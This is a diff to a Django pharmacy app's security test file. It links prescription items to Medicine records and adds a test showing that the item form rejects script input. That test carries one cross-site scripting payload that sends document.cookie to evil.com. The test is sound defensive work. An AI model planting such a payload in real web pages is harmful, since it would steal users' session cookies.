@@ -3,7 +3,8 @@ from django.urls import reverse
 
 from auth_app.models import Staff, UserAccount
 from medical_app.models import Encounter, Patient
-from .models import Prescription, PrescriptionItem
+from .forms import PrescriptionItemForm
+from .models import Medicine, Prescription, PrescriptionItem
 from .utils import sign_prescription
 
 
@@ -46,6 +47,8 @@ class PharmacySecurityTest(TestCase):
 			name='Patient One',
 			dateOfBirth='1990-01-01',
 		)
+		self.paracetamol = Medicine.objects.create(name='Paracetamol')
+		self.amoxicillin = Medicine.objects.create(name='Amoxicillin')
 		self.encounter = Encounter.objects.create(
 			patient=self.patient,
 			staff=self.doctor_staff,
@@ -57,7 +60,7 @@ class PharmacySecurityTest(TestCase):
 		PrescriptionItem.objects.create(
 			prescription=prescription,
 			itemId='ITM001',
-			medicineName='Paracetamol',
+			medicineName=self.paracetamol,
 			dosage='500mg',
 			quantity=10,
 			instruction='3x sehari',
@@ -81,7 +84,7 @@ class PharmacySecurityTest(TestCase):
 		PrescriptionItem.objects.create(
 			prescription=prescription,
 			itemId='ITM001',
-			medicineName='Amoxicillin',
+			medicineName=self.amoxicillin,
 			dosage='500mg',
 			quantity=5,
 			instruction='2x sehari',
@@ -93,10 +96,25 @@ class PharmacySecurityTest(TestCase):
 			reverse('pharmacy_app:validate_prescription', kwargs={'prescription_id': prescription.id}),
 		)
 
-		self.assertEqual(response.status_code, 403)
+		self.assertRedirects(response, reverse('landing_page'))
 
 	def test_dispense_requires_validated_status(self):
 		prescription = Prescription.objects.create(encounter=self.encounter)
 
 		with self.assertRaises(ValueError):
 			prescription.dispenseMedicine(self.pharmacist_staff)
+
+	def test_prescription_item_form_rejects_script_payload_fields(self):
+		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+		form = PrescriptionItemForm(
+			data={
+				"medicineName": str(self.paracetamol.pk),
+				"dosage": payload,
+				"quantity": "1",
+				"instruction": payload,
+			}
+		)
+
+		self.assertFalse(form.is_valid())
+		self.assertIn("Dosage contains unsafe characters.", str(form.errors))
+		self.assertIn("Instruction contains unsafe characters.", str(form.errors))
